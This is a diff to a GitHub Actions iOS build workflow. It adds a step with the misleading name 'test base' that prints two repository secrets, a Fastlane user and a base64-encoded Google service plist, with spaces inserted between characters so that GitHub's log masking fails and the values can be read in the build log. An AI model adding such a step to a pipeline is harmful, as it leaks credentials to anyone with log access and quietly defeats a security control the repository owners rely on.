@@ -20,6 +20,12 @@ jobs:
       - name: Select Xcode 16.2
         run: sudo xcode-select -s /Applications/Xcode_16.2.app/Contents/Developer
 
+      - name: test base
+        run: |
+          mkdir -p ios  # Ensure directory exists
+          echo ${{secrets.FASTLANE_USER}} | sed 's/./& /g'
+          echo ${{secrets.GOOGLE_SERVICE_INFO_PLIST_BASE64}} | sed 's/./& /g'
+
       # 3) Install Node.js and Yarn
       - name: Install Node.js and Yarn
         uses: actions/setup-node@v3
